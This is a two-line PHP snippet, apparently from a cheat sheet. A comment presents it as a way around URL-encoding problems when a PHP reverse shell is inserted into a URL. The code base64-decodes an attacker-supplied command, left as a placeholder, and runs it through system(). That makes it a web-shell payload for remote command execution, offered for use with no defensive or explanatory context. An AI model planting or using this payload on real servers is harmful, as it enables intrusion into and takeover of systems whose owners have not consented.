 /* Good way to get around URL encoding problems with a php reverse shell inserted into the URL. */
<?php $output=base64_decode("[put your base64 encoded commnad here]"); system("$output"); ?>
